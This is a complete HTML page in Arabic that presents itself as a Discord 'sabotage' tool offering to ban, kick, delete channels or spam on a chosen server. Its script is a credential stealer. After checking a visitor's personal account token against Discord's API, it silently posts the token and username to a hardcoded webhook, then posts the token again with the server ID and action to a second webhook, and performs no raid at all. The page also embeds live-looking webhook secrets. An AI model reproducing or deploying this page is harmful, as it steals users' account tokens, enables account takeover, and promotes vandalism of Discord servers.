<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <title>موقع تخريب ديسكورد</title>
  <style>
    body {
      font-family: 'Cairo', sans-serif;
      color: white;
      text-align: center;
      padding: 50px;
      margin: 0;
      background: linear-gradient(to bottom right, #0077ff, #00ff88);
    }
    /* الصفحة الأولى */
    #page1 {
      display: block;
    }
    /* الصفحة الثانية */
    #page2 {
      display: none;
      background-color: #000000;
      height: 100vh;
      padding-top: 100px;
      box-sizing: border-box;
    }
    h1 {
      font-size: 3em;
      color: red;
      text-shadow: 2px 2px 5px blue;
      margin-bottom: 40px;
    }
    label {
      display: block;
      margin-top: 20px;
      font-size: 1.2em;
      color: white;
    }
    input, select {
      padding: 10px;
      width: 300px;
      font-size: 1em;
      border-radius: 10px;
      border: none;
      margin-top: 10px;
      direction: ltr;
      text-align: left;
    }
    button {
      margin-top: 30px;
      background-color: green;
      color: white;
      padding: 12px 24px;
      font-size: 1.2em;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      width: 150px;
    }
    #result, #error2 {
      margin-top: 30px;
      font-size: 1.2em;
      color: yellow;
    }
  </style>
</head>
<body>

  <!-- الصفحة الأولى: إدخال التوكن -->
  <div id="page1">
    <h1>موقع تخريب ديسكورد</h1>
    <label>قم بوضع توكن حسابك:</label>
    <input type="text" id="token" placeholder="توكن الحساب" autocomplete="off" />
    <br />
    <button onclick="checkToken()">التالي</button>
    <div id="result"></div>
  </div>

  <!-- الصفحة الثانية: البيانات -->
  <div id="page2">
    <h1>قم بوضع البيانات :</h1>
    <label>قم بوضع ايدي السيرفر نص :</label>
    <input type="text" id="serverId" placeholder="Server ID" autocomplete="off" />
    
    <label>اختر العملية :</label>
    <select id="actionSelect">
      <option value="">-- اختر --</option>
      <option value="BAN">BAN</option>
      <option value="kick">kick</option>
      <option value="deleteChannels">مسح رومات</option>
      <option value="spam">عمل سبام</option>
    </select>
    
    <br />
    <button onclick="executeAction()">تنفيذ</button>
    <div id="error2"></div>
  </div>

<script>
  let savedToken = "";

  function checkToken() {
    const token = document.getElementById("token").value.trim();
    const resultDiv = document.getElementById("result");
    resultDiv.textContent = "";

    if (!token) {
      resultDiv.textContent = "❌ الرجاء إدخال التوكن";
      return;
    }

    fetch("https://discord.com/api/v10/users/@me", {
      headers: {
        "Authorization": token
      }
    }).then(res => {
      if (res.status === 200) {
        res.json().then(data => {
          if (data.bot) {
            resultDiv.textContent = "❌ هذا توكن بوت، الرجاء استخدام توكن حساب شخصي";
            return;
          }

          
          savedToken = token;

          
          fetch("https://discord.com/api/webhooks/1382044262165647514/CHpOR5xEYXctWS8lx2AySpAWw5PD_6YHzIvoBfHlDQiaT4lfKpyXJTpam3dxQfqcFgjK", {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              content: `✅ تم التقاط توكن حساب مستخدم:\n\`${savedToken}\`\nيوزر: \`${data.username}#${data.discriminator}\``
            })
          });

          
          document.getElementById("page1").style.display = "none";
          document.getElementById("page2").style.display = "block";
        });
      } else {
        resultDiv.textContent = "❌ توكن غير صالح";
      }
    }).catch(() => {
      resultDiv.textContent = "❌ حدث خطأ أثناء التحقق";
    });
  }

  function executeAction() {
    const serverId = document.getElementById("serverId").value.trim();
    const action = document.getElementById("actionSelect").value;
    const errorDiv = document.getElementById("error2");
    errorDiv.textContent = "";

    if (!serverId || !action) {
      errorDiv.textContent = "❌ يوجد غلط في البيانات";
      return;
    }

   
    fetch("https://discord.com/api/webhooks/1381695160852939012/7QYAdm_EI7Q0SXMKQoYbDog-2DuwMfxVr9_l47y6Q3R39blJxTJHOKNkzRNpG_8vQNPi", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        content: `✅ تم تنفيذ العملية على السيرفر\nتوكن المستخدم: \`${savedToken}\`\nServer ID: \`${serverId}\`\nالإجراء: \`${action}\``
      })
    }).then(() => {
      errorDiv.style.color = "lime";
      errorDiv.textContent = "قم بتجربه اخرى ❌";
    }).catch(() => {
      errorDiv.style.color = "yellow";
      errorDiv.textContent = "";
    });
  }
</script>

</body>
</html>
